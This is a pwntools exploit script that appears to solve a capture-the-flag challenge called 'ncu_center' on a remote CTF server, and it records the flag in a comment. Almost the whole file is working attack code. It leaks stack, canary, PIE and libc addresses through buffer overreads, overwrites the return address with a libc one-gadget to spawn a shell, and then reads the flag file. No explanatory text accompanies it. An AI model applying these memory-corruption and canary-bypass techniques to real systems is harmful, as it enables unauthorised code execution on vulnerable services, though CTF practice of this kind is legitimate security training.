#!/usr/bin/env python
from pwn import *

# AD{He110_1m_yuawn!}

context.arch = 'amd64'

e , l = ELF( './ncu_center' ) , ELF( './libc.so.6' )

host , port = 'ctf.yuawn.idv.tw' , 10107
y = remote( host , port )

def echo( data ):
        y.sendafter( 'ice:' , '1' )
        y.sendafter( 'say:' , data )

def add( idx , data ):
        y.sendafter( 'ice:' , '2' )
        y.sendafter( '?:' , str( idx ) )
        y.sendafter( ':' , data )

def sho( idx ):
        y.sendafter( 'ice:' , '3' )
        y.sendafter( '?:' , str( idx ) )

def mod( idx , data ):
        y.sendafter( 'ice:' , '4' )
        y.sendafter( '?:' , str( idx ) )
        y.sendafter( ':' , data )


add( 1 , 'a' * 0x10 )
add( 2 , 'b' * 0x10 )
add( 3 , 'c' * 0x10 )
mod( 1 , 'a' )

sho( 3 )

y.recvuntil('c' * 0x10)
stk = u64( y.recv(6).ljust( 8 , '\x00' ) ) - 0x120
log.success( 'stk -> {}'.format( hex( stk ) ) )

mod( 3 , 'D' * 0x18 + 'a' )
sho( 3 )
y.recvuntil('D' * 0x18)
canary = u64( y.recv(8) ) - ord( 'a' )
log.success( 'canary -> {}'.format( hex( canary  ) ) )


echo( 'D' * 0x28 )
y.recvuntil('D' * 0x28)
pie = u64( y.recv(6).ljust( 8 , '\x00' ) ) - 0x930
log.success( 'PIE -> {}'.format( hex( pie ) ) )

echo( 'D' * 0x48 )
y.recvuntil('D' * 0x48)
l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - 0x36e90
log.success( 'libc -> {}'.format( hex( l.address ) ) )


add( 2 , 'b' * 0x10 )
add( 3 , 'c' * 0x10 )
mod( 2 , 'a' )

magic = 0xf1117

p = flat(
    'D' * 0x18,
    canary,
    0,
    l.address + magic
)

mod( 3 , p )

y.sendafter( 'ice:' , '5' )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()